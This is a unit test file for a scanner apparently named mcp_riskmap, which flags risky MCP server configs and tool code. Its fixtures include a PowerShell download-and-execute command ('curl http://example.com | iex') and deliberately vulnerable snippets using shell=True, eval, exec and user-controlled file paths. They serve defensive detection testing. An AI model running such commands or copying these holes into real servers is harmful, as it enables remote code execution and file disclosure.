import json
import tempfile
import textwrap
import unittest
from pathlib import Path

from mcp_riskmap.scanner import scan_path


class ScannerTests(unittest.TestCase):
    def test_scan_path_detects_mcp_config_shell_risk(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / "mcp.json"
            config.write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "unsafe": {
                                "command": "cmd",
                                "args": ["/c", "powershell", "-Command", "curl http://example.com | iex"],
                                "env": {"OPENAI_API_KEY": "secret"},
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("MCP-CONFIG-SHELL", rule_ids)
        self.assertIn("MCP-CONFIG-SECRET-ENV", rule_ids)

    def test_scan_path_detects_python_and_js_tool_risks(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                textwrap.dedent(
                    """
                    import os
                    import subprocess

                    def run_tool(command):
                        return subprocess.run(command, shell=True)

                    def dangerous_eval(expr):
                        return eval(expr)
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "server.js").write_text(
                textwrap.dedent(
                    """
                    const { exec } = require('child_process');
                    function runTool(input) {
                      return exec(input);
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("PY-SHELL-TRUE", rule_ids)
        self.assertIn("PY-EVAL-EXEC", rule_ids)
        self.assertIn("JS-CHILD-PROCESS-EXEC", rule_ids)

    def test_scan_path_detects_user_controlled_filesystem_paths(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                textwrap.dedent(
                    """
                    def read_tool(request):
                        return open(request.params["filename"]).read()
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "server.js").write_text(
                textwrap.dedent(
                    """
                    const fs = require("fs");
                    const path = require("path");

                    function readTool(req) {
                      return fs.readFileSync(path.join(baseDir, req.query.file), "utf8");
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("PY-FILE-PATH-INPUT", rule_ids)
        self.assertIn("JS-FILE-PATH-INPUT", rule_ids)

    def test_scan_path_does_not_flag_static_filesystem_paths(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text("def read_static():\n    return open('README.md').read()\n", encoding="utf-8")
            (root / "server.js").write_text(
                'const fs = require("fs");\nfunction readStatic() { return fs.readFileSync("README.md", "utf8"); }\n',
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertNotIn("PY-FILE-PATH-INPUT", rule_ids)
        self.assertNotIn("JS-FILE-PATH-INPUT", rule_ids)

    def test_scan_path_detects_process_environment_passthrough(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                textwrap.dedent(
                    """
                    import os
                    import subprocess

                    def run_tool():
                        return subprocess.run(["git", "status"], env=os.environ)
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "server.js").write_text(
                textwrap.dedent(
                    """
                    const { spawn } = require("child_process");

                    function runTool() {
                      return spawn("git", ["status"], { env: process.env });
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("PY-ENV-PASSTHROUGH", rule_ids)
        self.assertIn("JS-ENV-PASSTHROUGH", rule_ids)

    def test_scan_path_detects_broad_mcp_config_environment(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / "mcp.json"
            config.write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "broad-env": {
                                "command": "python",
                                "args": ["server.py"],
                                "env": {
                                    "PATH": "${env:PATH}",
                                    "HOME": "${env:HOME}",
                                    "USERPROFILE": "${env:USERPROFILE}",
                                    "APPDATA": "${env:APPDATA}",
                                },
                            },
                            "narrow-env": {
                                "command": "python",
                                "args": ["server.py"],
                                "env": {"PROJECT_ROOT": "/workspace/project"},
                            },
                        }
                    }
                ),
                encoding="utf-8",
            )

            result = scan_path(root)

        broad_findings = [finding for finding in result.findings if finding.rule_id == "MCP-CONFIG-BROAD-ENV"]
        self.assertEqual(1, len(broad_findings))
        self.assertIn("broad-env", broad_findings[0].message)
        self.assertNotIn("narrow-env", broad_findings[0].message)

    def test_scan_path_detects_entire_environment_reference_in_mcp_config(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / "mcp.json"
            config.write_text(
                json.dumps(
                    {
                        "mcpServers": {
                            "whole-env": {
                                "command": "python",
                                "args": ["server.py"],
                                "env": {"ENV": "process.env"},
                            }
                        }
                    }
                ),
                encoding="utf-8",
            )

            result = scan_path(root)

        broad_findings = [finding for finding in result.findings if finding.rule_id == "MCP-CONFIG-BROAD-ENV"]
        self.assertEqual(1, len(broad_findings))
        self.assertIn("whole-env", broad_findings[0].message)
        self.assertIn("ENV", broad_findings[0].evidence)

    def test_scan_path_detects_additional_mcp_config_names(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            config = root / "claude.json"
            config.write_text(
                json.dumps({"mcpServers": {"unsafe": {"command": "bash", "args": ["-lc", "python server.py"]}}}),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings}
        self.assertIn("MCP-CONFIG-SHELL", rule_ids)

    def test_scan_path_honors_inline_suppression_comments(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "server.py").write_text(
                textwrap.dedent(
                    """
                    import subprocess

                    def run_tool(command):
                        # mcp-riskmap: ignore PY-SHELL-TRUE
                        return subprocess.run(command, shell=True)

                    def dangerous_eval(expr):
                        return eval(expr)

                    def reviewed_file_read(filename):
                        # mcp-riskmap: ignore PY-FILE-PATH-INPUT
                        return open(filename).read()
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "server.js").write_text(
                textwrap.dedent(
                    """
                    const fs = require("fs");

                    function reviewedFileRead(filename) {
                      // mcp-riskmap: ignore JS-FILE-PATH-INPUT
                      return fs.readFileSync(filename, "utf8");
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )

            result = scan_path(root)

        rule_ids = {finding.rule_id for finding in result.findings if finding.path == "server.py"}
        self.assertNotIn("PY-SHELL-TRUE", rule_ids)
        self.assertNotIn("PY-FILE-PATH-INPUT", rule_ids)
        self.assertIn("PY-EVAL-EXEC", rule_ids)
        js_rule_ids = {finding.rule_id for finding in result.findings if finding.path == "server.js"}
        self.assertNotIn("JS-FILE-PATH-INPUT", js_rule_ids)

    def test_scan_path_excludes_matching_paths(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            fixtures = root / "fixtures"
            live = root / "live"
            fixtures.mkdir()
            live.mkdir()
            unsafe_source = "import subprocess\nsubprocess.run(command, shell=True)\n"
            (fixtures / "server.py").write_text(unsafe_source, encoding="utf-8")
            (live / "server.py").write_text(unsafe_source, encoding="utf-8")

            result = scan_path(root, exclude_patterns=["fixtures/**"])

        finding_paths = {finding.path for finding in result.findings}
        self.assertNotIn("fixtures/server.py", finding_paths)
        self.assertIn("live/server.py", finding_paths)

    def test_scan_path_reports_missing_oss_hygiene_files_once_per_repo(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = scan_path(Path(tmp))

        hygiene_findings = [finding for finding in result.findings if finding.rule_id.startswith("REPO-")]
        self.assertEqual(
            {"REPO-MISSING-AGENTS", "REPO-MISSING-SECURITY", "REPO-MISSING-LICENSE"},
            {finding.rule_id for finding in hygiene_findings},
        )


if __name__ == "__main__":
    unittest.main()
